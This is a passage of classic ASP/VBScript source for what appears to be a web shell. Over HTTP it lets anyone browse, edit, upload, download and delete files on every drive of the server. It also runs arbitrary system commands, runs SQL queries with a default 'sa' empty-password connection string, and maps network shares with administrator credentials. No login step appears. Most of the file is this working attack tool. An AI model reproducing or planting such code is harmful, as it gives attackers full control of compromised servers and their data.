	if (FSO.FolderExists(itemPath)=false) and (FSO.FileExists(itemPath)=false) then
	FSO.CreateTextFile(itemPath)
	if Err.Number<>0 then
		gMsg="Unable to create the file """ & itemName & """, an error occured..."
		myInfo.add "error", Err.Number
	else
		gMsg="Created the file """ & itemName & """..."
		myInfo.add "error", 0
	end if
	else
	gMsg="Unable to create the file """ & itemName & """, there exists a file or a folder with the same name..."
		myInfo.add "error", 1
	end if

	if Err.Number <> 0 then
		myInfo.add "errorDesc", Err.Description	& vbCrLF & gMsg
	else
		myInfo.add "errorDesc", gMsg
	end if

	Set f1 = FSO.GetFile(itemPath)

	newItem = f1.name & "|" & FormatSize(f1.size) & "|" & f1.type & "|" & replace(f1.DateLastModified, "/", "-") & "|" & replace(f1.DateCreated, "/", "-")

	with myInfo
		.add "action", "newFile"
		.add "itemName", itemName
		.add "msgResponse", gMsg
		.add "newItem", newItem
	end with

	ajaxNewFile = js.toJSON("action", myInfo, true)
end function

function ajaxNewFolder()
	on error resume next
	Dim myInfo, itemName, itemPath, gMsg, newItem, f1

	itemName=request.form("itemName")
	itemPath=folderLocation & itemName

	set js = new JSON
	set myInfo = server.createObject("scripting.dictionary")
	set newItem = server.createObject("scripting.dictionary")

	if (FSO.FolderExists(itemPath)=false) and (FSO.FileExists(itemPath)=false) then
	FSO.CreateFolder(itemPath)
	if Err.Number<>0 then
		gMsg="Unable to create the folder """ & itemName & """, an error occured..."
		myInfo.add "error", Err.Number
	else
		gMsg="Created the folder """ & itemName & """..."
		myInfo.add "error", 0
	end if
	else
	gMsg="Unable to create the folder """ & itemName & """, there exists a file or a folder with the same name..."
		myInfo.add "error", 1
	end if

	if Err.Number <> 0 then
		myInfo.add "errorDesc", Err.Description	& vbCrLF & gMsg
	else
		myInfo.add "errorDesc", gMsg
	end if

	Set f1 = FSO.GetFolder(itemPath)

	newItem = f1.name & "|" & replace(f1.DateLastModified, "/", "-") & "|" & replace(f1.DateCreated, "/", "-")

	with myInfo
		.add "action", "newFolder"
		.add "itemName", itemName
		.add "msgResponse", gMsg
		.add "newItem", newItem
	end with

	ajaxNewFolder = js.toJSON("action", myInfo, true)
end function

function filesfoldersList()
	on error resume next
	Dim f, fc, f1, counter, counterId, endId, myFolderList(), myFileList(), itemStart, itemEnd, myInfo, totalFiles, totalFolders, counterItems

	set js = new JSON
	set myInfo = server.createObject("scripting.dictionary")
	Set f = FSO.GetFolder(folderLocation)
	call ErrHandle("lstResponse")
	itemStart=request.form("itemStart")

	if(itemStart = "" or itemStart = "0") then
		itemStart = 1
	else
		itemStart = Cint(itemStart)
	end if

	itemEnd = itemStart + 199

	if(itemStart = 1) then
		Set fc = f.SubFolders
		counter = 1

		Redim myFolderList(0)
		myFolderList(0) = "noxxxinfo"

		For Each f1 In fc
			Redim preserve myFolderList(counter)
				myFolderList(counter) = f1.name & "|" & replace(f1.DateLastModified, "/", "-") & "|" & replace(f1.DateCreated, "/", "-")
			counter=counter+1
		Next
		Session("myFolderList") = myFolderList

		Set fc = f.Files
		counter = 1

		Redim myFileList(0)
		myFileList(0) = "noxxxinfo"

		For Each f1 In fc
			Redim preserve myFileList(counter)
			myFileList(counter) = f1.name & "|" & FormatSize(f1.size) & "|" & f1.type & "|" & replace(f1.DateLastModified, "/", "-") & "|" & replace(f1.DateCreated, "/", "-")
			counter=counter+1
		Next
		Session("myFileList") = myFileList
	end if

	totalFolders = UBound(Session("myFolderList"))
	totalFiles = UBound(Session("myFileList"))

	call ErrHandle("lstResponse")

	Redim myFolderList(0)
	myFolderList(0) = "noxxxinfo"

	Redim myFileList(0)
	myFileList(0) = "noxxxinfo"
	counterItems = 0

	if(itemStart <= totalFolders) then
		if(totalFolders <= itemEnd) then
			endId = totalFolders
		else
			endId = itemEnd
		end if
		counter = 0
		For counterId = itemStart to endId
			Redim preserve myFolderList(counter)
			myFolderList(counter) = Session("myFolderList")(counterId)
			counter=counter+1
			counterItems = counterItems + 1
		Next
	end if

	if(itemStart + counterItems <= totalFolders + totalFiles) then
		if(totalFolders + totalFiles <= itemEnd) then
			endId = totalFiles
		else
			endId = itemEnd - totalFolders
		end if
		'Response.Write itemStart + counterItems - totalFolders & " - " & endId
		counter = 0
		For counterId = itemStart + counterItems - totalFolders to endId
			Redim preserve myFileList(counter)
			myFileList(counter) = Session("myFileList")(counterId)
			counter=counter+1
			counterItems = counterItems + 1
		Next
	end if

	if(itemEnd >= totalFolders + totalFiles) then
		myInfo.add "finished", true
	else
		myInfo.add "finished", false
	end if

	with myInfo
		.add "totalFolders", totalFolders
		.add "totalFiles", totalFiles
		.add "itemStart", itemStart
	end with

	filesfoldersList = js.toJSON("status", myInfo, true) & "," & js.toJSON("folders", myFolderList, true) & "," & js.toJSON("files", myFileList, true)
end function

SELECT CASE mode
CASE "explorer"
	ajaxExplorer()
	Response.end

CASE "mapDriver"
	Response.Write "actionResponse = {"
	Response.Write ajaxMapDriver()
	Response.Write "};"
	Response.End

CASE "removeDriver"
	Response.Write "actionResponse = {"
	Response.Write ajaxRemoveDriver()
	Response.Write "};"
	Response.End

CASE "newFile"
	Response.Write "actionResponse = {"
	Response.Write ajaxNewFile()
	Response.Write "};"
	Response.End

CASE "newFolder"
	Response.Write "actionResponse = {"
	Response.Write ajaxNewFolder()
	Response.Write "};"
	Response.End

CASE "copy"
	Response.Write "actionResponse = {"
	Response.Write ajaxCopy()
	Response.Write "};"
	Response.End

CASE "move"
	Response.Write "actionResponse = {"
	Response.Write ajaxMove()
	Response.Write "};"
	Response.End

CASE "delete"
	Response.Write "actionResponse = {"
	Response.Write ajaxDelete()
	Response.Write "};"
	Response.End

CASE "runSQL"
	Response.Write "actionResponse = {"
	Response.Write ajaxRunSQL()
	Response.Write "};"
	Response.End

CASE "runCMD"
	Response.Write "actionResponse = {"
	Response.Write ajaxRunCMD()
	Response.Write "};"
	Response.End

CASE "loadFile"
	Response.Write "actionResponse = {"
	Response.Write ajaxLoadFile()
	Response.Write "};"
	Response.End

CASE "saveFile"
	Response.Write "actionResponse = {"
	Response.Write ajaxSaveFile()
	Response.Write "};"
	Response.End

CASE "renameFile"
	Response.Write "actionResponse = {"
	Response.Write ajaxRenameFile()
	Response.Write "};"
	Response.End

CASE "renameFolder"
	Response.Write "actionResponse = {"
	Response.Write ajaxRenameFolder()
	Response.Write "};"
	Response.End

CASE "script"
	on error resume next
	Response.contenttype="application/x-javascript"
	Response.CacheControl = "Public"
	Response.Write Base64Decode(script)
	Response.end

CASE "style"
	on error resume next
	Response.contenttype="text/css"
	Response.CacheControl = "Public"
	Response.Write Base64Decode(media_style)
	Response.end

CASE "download"
	on error resume next
	Dim file
	Response.Buffer=True
	file = Request("file")
	DownloadFile folderLocation & file
	Response.end

CASE "image"
	on error resume next
	Dim imgId
	Response.ContentType="image/gif"
	Response.CacheControl = "Public"
	imgId = Request("imgid")
	SELECT CASE imgId
	CASE "loading"
		Response.BinaryWrite Base64ToBSTR(img_loading)
	CASE "dir"
		Response.BinaryWrite Base64ToBSTR(img_dir)
	CASE "lvup"
		Response.BinaryWrite Base64ToBSTR(img_lvUp)
	CASE "txt"
		Response.BinaryWrite Base64ToBSTR(img_txt)
	CASE "img"
		Response.BinaryWrite Base64ToBSTR(img_img)
	CASE ELSE
		Response.BinaryWrite Base64ToBSTR(img_unknow)
	END SELECT
	Response.end

CASE "view"
	on error resume next
	Dim extimg, Fil, imagePath
	Response.Buffer=True
	imagePath = Request("imagePath")

	If(Ucase(FSO.GetExtensionName(imagePath)) = "JPG" or Ucase(FSO.GetExtensionName(imagePath)) = "JPEG" or Ucase(FSO.GetExtensionName(imagePath)) = "JPE") Then
		extimg = "image/jpeg"
	Elseif(Ucase(FSO.GetExtensionName(imagePath)) = "GIF") Then
		extimg = "image/gif"
	Elseif(Ucase(FSO.GetExtensionName(imagePath)) = "BMP") Then
		extimg = "image/bmp"
	Else
		extimg = "image/png"
	End if
	Set Fil = FSO.GetFile(imagePath)
	Response.ContentType=extimg
	Response.CacheControl = "Public"
	'Response.AddHeader "Content-Length", Fil.Size
	Response.BinaryWrite readBinaryFile(Fil.path)
	Set Fil = Nothing
	Response.end
END SELECT

if(mode = "upload") then

dim linkBack

Response.Write "<html>"
Response.Write "<head>"
Response.Write "<title>" & aspTitle & "</title>"
Response.Write "<meta http-equiv=""Content-Type"" content=""text/html; charset=utf-8"">"
Response.Write "<META HTTP-EQUIV=""Pragma"" CONTENT=""no-cache"">"
Response.Write "<META HTTP-EQUIV=""Expires"" CONTENT=""-1"">"

Response.Write "<link rel=""stylesheet"" href=""?mode=style"" type=""text/css"" />"
Response.Write "</head>"
Response.Write "<body>"

Response.Write "<div align=""center"">"
Response.Write "<table cellpadding=""2"" cellspacing=""2"" width=""500"">"
Response.Write "<thead  width=""100%"" align=""center"">"
Response.Write "	<td class=""kbrtm"" align=""center"" colspan=""2""><b>File Upload</b></td>"
Response.Write "</thead>"

linkBack = Upload(folderLocation)

Response.Write "<TR><TD align='center' class=""kbrtm""><A href="""& linkBack &""">[Back]</A></TD></TR>"
Response.Write "</table>"
Response.Write "</div>"

Response.Write "</body>"
Response.Write "</html>"

Response.End
end if

Dim drive_, driversText
	for each drive_ in FSO.Drives
		driversText = driversText & "<tr id=""driver" & drive_.DriveLetter & """><td class=""kbrtm"">"
		driversText = driversText & "<a href="""&FilePath&"#Explorer|"&drive_.DriveLetter&":\"">"
		if drive_.Drivetype=1 then driversText = driversText & "&nbsp;&nbsp;Floppy Drive"
		if drive_.Drivetype=2 then driversText = driversText & "&nbsp;&nbsp;Hard Disk"
		if drive_.Drivetype=3 then driversText = driversText & "&nbsp;&nbsp;Network Drive"
		if drive_.Drivetype=4 then driversText = driversText & "&nbsp;&nbsp;Cd-Rom"
		driversText = driversText & " [" & drive_.DriveLetter & ":]</a>"
		if drive_.Drivetype=3 then driversText = driversText & "&nbsp;&nbsp;<a href=""javascript:removeDriver('" & drive_.DriveLetter & "');"">[Remove]</a>"
		driversText = driversText &  "</td></tr>"
	next

Response.Write "<html>"
Response.Write "<head>"
Response.Write "<title>" & aspTitle & "</title>"
Response.Write "<meta http-equiv=""Content-Type"" content=""text/html; charset=utf-8"">"
Response.Write "<META HTTP-EQUIV=""Pragma"" CONTENT=""no-cache"">"
Response.Write "<META HTTP-EQUIV=""Expires"" CONTENT=""-1"">"

Response.Write "<link rel=""stylesheet"" href=""?mode=style"" type=""text/css"" />"
Response.Write "<script src=""?mode=script"" type=""text/javascript""></script>"
Response.Write "<script type=""text/javascript"">"
Response.Write "ffList = {"
Response.Write  ajaxInfo()
Response.Write "};"
Response.Write "</script>"
Response.Write "</head>"
Response.Write "<body onload=""startLoad()"">"

Response.Write "<div id=""container"" align=""center"">"

Response.Write "<div id=""tblHead"" align=""center""><P>&nbsp;</P>"
Response.Write "<form onSubmit=""window.location.href = '#Explorer|'+getId('remote').value.addSlash();return false;"" method=""post"">"
Response.Write "<table cellpadding=""0"" cellspacing=""0""><tr><td style=""background-color:121212"" class=""kbrtm"">&nbsp;&nbsp;&nbsp;<b>Location :</b>&nbsp;&nbsp;&nbsp;</td><td><input name=""remote"" id=""remote"" value='' type=""text"" style=""width:350px;""></td><td><input type=""Submit"" value=""Go &raquo;"" style=""width:50; font-weight:bold;""></td></tr></table>"
Response.Write "</form>"
Response.Write "<P>&nbsp;</P>"
Response.Write "</div>"

Response.Write "<div id=""tblErr"" style=""display:none"" align=""center"">"
Response.Write "<table cellpadding=""2"" cellspacing=""2"" width=""500"">"
Response.Write "<thead  width=""100%"" align=""center"">"
Response.Write "	<td class=""kbrtm"" style=""background-color:121212"" align=""center"" colspan=""2""><b>Error !!!</b></td>"
Response.Write "</thead>"
Response.Write "<tbody bgcolor=""#3a3a3a"">"
Response.Write "<TR>"
Response.Write "	<TD width=""20%"" class=""kbrtm"" id=""errCode"">&nbsp;</TD>"
Response.Write "	<TD width=""80%"" class=""kbrtm""><font id=""errDesc"" color=""red"">&nbsp;</font></TD>"
Response.Write "</TR>"
Response.Write "</tbody>"
Response.Write "</table>"
Response.Write "<BR>&nbsp;</BR>"
Response.Write "</div>"


Response.Write "<div align=""center"">"
Response.Write "<font id=""ffNo"" style=""font-weight:bold;color:orange;display:none;"">Total : <span style=""color:red;"" id=""totalFolders"">0</span> folder(s) and <span style=""color:red;"" id=""totalFiles"">0</span> file(s)<BR><span style=""color:red;"" id=""folderNo"">0</span> folder(s) and <span style=""color:red;"" id=""fileNo"">0</span> file(s) listed !&nbsp;&nbsp;&nbsp;<input type=""button"" id=""btLoadmore"" onClick=""loadMore();"" value=""[Load More]"" style=""display:none;font-weight:bold;""></font><BR>&nbsp;"
Response.Write "<table id=""tblContent"" cellpadding=""0px"" cellspacing=""1px"" width=""95%"" style=""border:1px solid #5d5d5d;min-width:1280;"">"
Response.Write "<thead width=""100%"" class=""tableHead"" align=""center"">"
Response.Write "<tr>"
Response.Write "	<TD class=""fname""><b>Name</b></TD>"
Response.Write "	<TD class=""fsize""><b>Size</b></TD>"
Response.Write "	<TD class=""ftype""><b>Type</b></TD>"
Response.Write "	<TD class=""fdate""><b>Date Last Modified</b></TD>"
Response.Write "	<TD class=""fdate""><b>Date Created</b></TD>"
Response.Write "	<TD class=""faction"" colspan=""3""><b>Action</b></TD>"
Response.Write "</tr>"
Response.Write "</thead>"
Response.Write "<tbody id=""tblList"" bgcolor=""#3a3a3a"">"
Response.Write "</tbody>"
Response.Write "<tbody id=""tblCommand"" width=""100%"">"
Response.Write "<tr>"
Response.Write "	<TD>&nbsp;</TD>"
Response.Write "	<TD></TD>"
Response.Write "	<TD></TD>"
Response.Write "	<TD></TD>"
Response.Write "	<TD></TD>"
Response.Write "	<TD align=""center""><input type='checkbox' title='Select All' class='xcheck' name='checkboxAll' onClick='checkAll(this);' value='all'></TD>"
Response.Write "	<TD align=""center""><input type=""button"" onClick=""Delete();"" value=""Delete &raquo;"" style=""font-weight:bold;""></TD>"
Response.Write "	<TD></TD>"
Response.Write "</tr>"
Response.Write "</tbody>"
Response.Write "<tbody width=""100%"">"
Response.Write "<tr>"
Response.Write "	<TD><input type=""button"" onClick=""newFolder();"" value=""New Folder &raquo;"" style=""font-weight:bold;"">&nbsp;&nbsp;&nbsp;<input type=""button"" onClick=""newFile();"" value=""New File &raquo;"" style=""font-weight:bold;"">&nbsp;&nbsp;&nbsp;<input type=""button"" onClick=""window.location.href='#Upload|'+ffList.info.path.addSlash();"" value=""Upload &raquo;"" style=""font-weight:bold;""></TD>"
Response.Write "<form onSubmit=""CopyMove('copy', getId('remoteCopy').value);return false;"">"
Response.Write "	<TD align=""right"" colspan=""2"">Copy selected item(s) to :</TD>"
Response.Write "	<TD colspan=""2""><input name=""remoteCopy"" id=""remoteCopy"" value='' type=""text"" style=""width:250px;""><input type=""submit"" value=""Go &raquo;"" style=""width:50; font-weight:bold;""></TD>"
Response.Write "</form>"
Response.Write "	<TD colspan=""3""></TD>"
Response.Write "</tr>"
Response.Write "</tbody>"
Response.Write "<tbody  width=""100%"">"
Response.Write "<tr>"
Response.Write "	<TD>&nbsp;</TD>"
Response.Write "<form onSubmit=""CopyMove('move', getId('remoteMove').value);return false;"">"
Response.Write "	<TD align=""right"" colspan=""2"">Move selected item(s) to :</TD>"
Response.Write "	<TD colspan=""2""><input name=""remoteMove"" id=""remoteMove"" value='' type=""text"" style=""width:250px;""><input type=""submit"" value=""Go &raquo;"" style=""width:50; font-weight:bold;""></TD>"
Response.Write "</form>"
Response.Write "	<TD colspan=""3""></TD>"
Response.Write "</tr>"
Response.Write "</tbody>"
Response.Write "</table>"
Response.Write "</div>"


Response.Write "<div align=""center"">"
Response.Write "<table id=""tblPicture"" style=""display:none"" align=""center"" width=""95%""><TR><TD align='center' class=""kbrtm""><A href=""javascript:showMode('Explorer', true);"">[Back to Browser]</A></TD></TR><tr><td align='center' class=""kbrtm""><img id=""imgPicture"" src=""" & FilePath & "?mode=image&imgId=loading""></td></tr></table>"
Response.Write "<BR>&nbsp;</BR>"
Response.Write "</div>"

Response.Write "<div id=""tblFileEdit"" style=""display:none"" align=""center"">"
Response.Write "<form method=""post"" onSubmit=""saveFile();return false;"">"
Response.Write "<table class=""kbrtm"">"
Response.Write "<TR><TD align='center'><A href=""javascript:showMode('Explorer', true);"">[Back to Browser]</A></TD></TR>"
Response.Write "<tr>"
Response.Write "<td align=""center"">"
Response.Write "<b>Edit file : <font color=orange id=""lblFile"">"&folderLocation&"</font></b><br>"
Response.Write "<textarea name=""txtContent"" id=""txtContent"" style='width:800;height:600;'>"
Response.Write ""
Response.Write "</textarea>"
Response.Write "<br><br><input type=submit value="":: Save ::""><br></td></tr><tr><td align=""center"">"
Response.Write "</td></tr></table></form>"
Response.Write "</div>"


Response.Write "<div id=""tblUpload"" style=""display:none"" align=""center"">"
Response.Write "<table width=""600"">"
Response.Write "<TR><TD align='center' class=""kbrtm""><A href=""javascript:showMode('Explorer', true);"">[Back to Browser]</A></TD></TR>"
Response.Write "<tr><td class=""kbrtm"" align=""center"">Location : <b><font color=orange id=""uploadLocation""></font></b></td></tr>"
Response.Write "<tr><td align=""center"" class=""kbrtm"">"
Response.Write "<form name=""frmUpload"" method=""post"" enctype=""multipart/form-data"" action=""" & FilePath & "?mode=upload"" ID=""frmUpload"">"
Response.Write "<input type=hidden name=""linkBack"" id=""linkBack"" value=""#"">"
Response.Write "<input type=hidden name=""location"" value="""" ID=""txtuploadLocation"">"
Response.Write "Max: <input type=""text"" name=""max"" value=""1"" size=""2"" ID=""idMax""> <input type=""button"" value=""Set"" onclick=""setid();"">"
Response.Write "<table>"
Response.Write "<tr>"
Response.Write "<td id=""upid"">"
Response.Write "</td>"
Response.Write "</tr>"
Response.Write "</table>"
Response.Write "<input type=submit value=""::  Upload  ::"">"
Response.Write "</form>"
Response.Write "<script>"
Response.Write "setid();"
Response.Write "function setid() {"
Response.Write "    str='';"
Response.Write "    if (getId('frmUpload').max.value<=0) getId('frmUpload').max.value=1;"
Response.Write "    if (getId('frmUpload').max.value > 10) getId('frmUpload').max.value=10;"
Response.Write "    for (i=1; i<=getId('frmUpload').max.value; i++) str+='File '+i+': <input size=30 type=file name=file'+i+'><br>';"
Response.Write "    getId('upid').innerHTML=str+'<br>';"
Response.Write "}"
Response.Write "</script>"
Response.Write "</td></tr></table>"
Response.Write "</div>"

Response.Write "<div id=""tblCmd"" style=""display:none"" align=""center"">"
Response.Write "<form onSubmit=""runCMD();return false;"" method=""post"">"
Response.Write "<table class=""kbrtm"">"
Response.Write "<TR><TD align='center'><A href=""javascript:showMode('Explorer', true);"">[Back to Browser]</A></TD></TR>"
Response.Write "<TR><TD align='center'><b>Command : </b><input style='color=#DAFDD0' name=""vcommand"" id=""vcommand"" size='57' value='ipconfig /all' type='text'><input value="".: Run :."" type='submit'></TD></TR>"
Response.Write "<tr>"
Response.Write "<td align=""center"">"
Response.Write "<textarea name=""txtCmdResult"" id=""txtCmdResult"" style='width:650;height:400;'>"
Response.Write "</textarea>"
Response.Write "</td></tr></table></form>"
Response.Write "</div>"

Response.Write "<div id=""tblSql"" style=""display:none"" align=""center"">"
Response.Write "<form onSubmit=""runSQL();return false;"" method=""post"">"
Response.Write "<table class=""kbrtm"">"
Response.Write "<TR><TD align='center' colspan='4' class=""kbrtm""><A href=""javascript:showMode('Explorer', true);"">[Back to Browser]</A></TD></TR>"
Response.Write "<TR>"
Response.Write "<TD><b>Connection String : </b></TD><TD colspan='3'><input style='color=#DAFDD0' name=""sqlconnection"" id=""sqlconnection"" size='121' value='Provider=SQLOLEDB;Data Source=127.0.0.1;database=master;uid=sa;pwd=;' type='text'></TD>"
Response.Write "</TR>"
Response.Write "<TR>"
Response.Write "<TD valign='top'><b>SQL Command : </b></TD><TD valign='top'><input type=""button"" id=""commandChange"" onClick=""sqlCommandChange();"" value="" <-> ""></TD>"
Response.Write "<TD><input style='color=#DAFDD0' name=""sqlcommand"" id=""sqlcommand"" size='100' value='SELECT TOP 1000 * FROM information_schema.tables' type='text'><textarea name=""txtsqlcommand"" id=""txtsqlcommand"" style='display:none;width:620px;height:150px;'>SELECT TOP 1000 * FROM information_schema.tables</textarea></TD>"
Response.Write "<TD valign='top'><input type=""submit"" value="":: Run ::""></TD></TR>"
Response.Write "<TR>"
Response.Write "<TD colspan='4' align=""center""><b><font color=orange id=""affected"">0</font> row(s) <span id=""lstAff"">listed</span> !</b></TD>"
Response.Write "</TR>"
Response.Write "</table>"
Response.Write "</form>"
Response.Write "<P>&nbsp;</P>"

Response.Write "<table class=""kbrtm"" id=""sqlContent"" width=""95%"">"
Response.Write "</table>"

Response.Write "</div>"


Response.Write "<div align=""center"">"
Response.Write "<table id=""tblDrivers"" cellpadding=""0"" cellspacing=""0"" width=""200""><TBODY>"
Response.Write "<tr><td class=""kbrtm"" style=""background-color:121212"" align=""center""><b>Drivers</b></td></tr>"
Response.Write driversText
Response.Write "<tr id=""addMapNetwork""><td class=""kbrtm"" align=""center""><a href=""javascript:showMapNetwork();"">[ + ]</a></td></tr>"
Response.Write "</TBODY></table>"
Response.Write "</div>"

Response.Write "<P>&nbsp;</P>"
Response.Write "</div>"

Response.Write "<div id=""tblMenu"" align=""center""><BR>&nbsp;"
Response.Write "<table cellpadding=""0"" cellspacing=""0"" height=""25""><tr><td class=""kbrtm1"">&nbsp;&nbsp;&nbsp;<a href=""javascript:showMode('Explorer', true);""><b>* Home *</B> </a> | <a href=""#SQL""><b>* SQL *</b></a> | <a href='#CMD'><b>* CMD *</b></a>&nbsp;&nbsp;&nbsp;</td></tr></table><br>"
Response.Write "</div>"

Response.Write "<div id=""tblMapDriver"" align=""center"">"
Response.Write "<form onSubmit=""mapDriver();return false;"" method=""post"">"
Response.Write "<table class=""kbrtm"">"
Response.Write "<TR><TD align='center' colspan=""2""><A href=""javascript:hideMapNetwork();"">[Back to Browser]</A></TD></TR>"
Response.Write "<TR><TD align='center'>Driver Letter : </TD><TD><input style='color=#DAFDD0' id=""driverLetter"" size='2' value='X' type='text'></TD></TR>"
Response.Write "<TR><TD align='center'>Remote Share : </TD><TD><input style='color=#DAFDD0' id=""remoteShare"" size='40' value='\\Server\Share' type='text'></TD></TR>"
Response.Write "<TR><TD align='center'>Username :</TD><TD><input style='color=#DAFDD0' id=""userName"" size='40' value='WORKGROUP\Administrator' type='text'></TD></TR>"
Response.Write "<TR><TD align='center'>Password : </TD><TD><input style='color=#DAFDD0' id=""password"" size='40' value='1234567890' type='text'></TD></TR>"
Response.Write "<tr><td align=""center"" colspan=""2""><input value="".: Map :."" type='submit'></td></tr>"
Response.Write "</table></form>"
Response.Write "</div>"

Response.Write "<div id=""overlay"">"
Response.Write "</div>"

Response.Write "<div id=""tblLoading"" align=""center"">"
Response.Write "<table width=""200"" height=""100"" style=""background:#303030;border-left:1px solid #5d5d5d; border-right:1px solid #121212; border-bottom:1px solid #121212; border-top:1px solid #5d5d5d;"" cellpadding=""0"" cellspacing=""0"" border=""0""><tr><td align=""center"" valign=""middle""><img src=""?mode=image&imgId=loading""></td></tr></table>"
Response.Write "</div>"

Response.Write "</body>"
Response.Write "</html>"
%>